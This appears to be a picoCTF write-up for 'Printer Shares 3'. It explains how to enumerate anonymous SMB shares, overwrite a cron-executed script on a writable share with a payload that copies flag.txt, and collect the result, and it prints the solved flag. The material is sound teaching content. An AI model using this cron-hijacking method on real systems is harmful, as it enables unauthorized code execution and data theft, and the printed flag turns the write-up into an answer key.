# CTF Write-up: Printer Shares 3

## Challenge Information

* **Event:** picoCTF
* **Challenge:** Printer Shares 3
* **Category:** General Skills
* **Difficulty:** Medium
* **Points:** 300
* **Author:** Janice He

### Description

I accidentally left the debug script in place... Well, I think that's fine - No one could possibly access my super secure directory.

Two printers are on `[INSTANCE_PORT]`, one private and one public.

You can test the service with:

```bash
nc -vz dolphin-cove.picoctf.net [INSTANCE_PORT]
```

*(Note: The port changes dynamically depending on the instance, e.g., `57243`).*

### Hints

1. A suspicious script is running every minute
2. This script runs every minute, you might need to wait for a while

---

# Initial Enumeration

Similar to previous versions of this challenge, the service exposes **two SMB shares** through a dynamically assigned port.

First, enumerate the shares using anonymous access:

```bash
smbclient -L //dolphin-cove.picoctf.net -p 57243 -N
```

The output reveals two shares:

* `shares` → Public Share With Guests
* `secure-shares` → Private printer share

---

# Investigating the Public Share

Connect to the public share:

```bash
smbclient //dolphin-cove.picoctf.net/shares -p 57243 -N
```

List the files:

```bash
ls
```

Two interesting files appear:

* `script.sh`
* `cron.log`

Download them for analysis:

```bash
get script.sh
get cron.log
```

### File Analysis

**script.sh**

A simple Bash script performing a periodic health check:

```bash
#!/bin/bash
echo "Health check: $(date)"
```

**cron.log**

This file records the output of the script execution.
The timestamps indicate that **the script runs every minute**.

---

# Vulnerability Analysis

The challenge description mentions a **debug script accidentally left in place**, and the hints emphasize a **script running every minute**.

Important observations:

* `script.sh` is located in a **public SMB share**
* The share allows **write access**
* A **cron job executes this script every minute**

This creates a **Cron Job Hijacking vulnerability**:

1. We modify the script.
2. The system executes it automatically.
3. Our malicious commands run with the cron job's privileges.

---

# Exploitation (Cron Job Hijacking)

Instead of opening a reverse shell, we can directly **search and copy the flag** into the public share.

---

## Step 1 — Modify the Script

Create a malicious version of `script.sh` locally:

```bash
#!/bin/bash
find / -name "flag.txt" -exec cp {} ./flag_stolen.txt \; 2>/dev/null
```

This payload:

* Searches the entire filesystem for `flag.txt`
* Copies it into the current directory
* Saves it as `flag_stolen.txt`
* Suppresses permission errors

---

## Step 2 — Upload the Malicious Script

Reconnect to the public SMB share:

```bash
smbclient //dolphin-cove.picoctf.net/shares -p 57243 -N
```

Overwrite the existing script:

```bash
put script.sh
```

---

## Step 3 — Wait for Cron Execution

Since the cron job runs **every minute**, wait approximately **60 seconds** for the system to execute the modified script.

---

# Retrieving the Flag

After waiting, list the files again:

```bash
ls
```

Example output:

```
.                 D        0
..                D        0
script.sh         A      391
cron.log          N      473
flag_stolen.txt   N       45
```

A new file named **flag_stolen.txt** appears.
Download it:

```bash
get flag_stolen.txt
exit
```

Read the contents:

```bash
cat flag_stolen.txt
```

---

# Flag

```
picoCTF{5mb_pr1nter_5h4re5_r3v3r53_0eb29140}
```
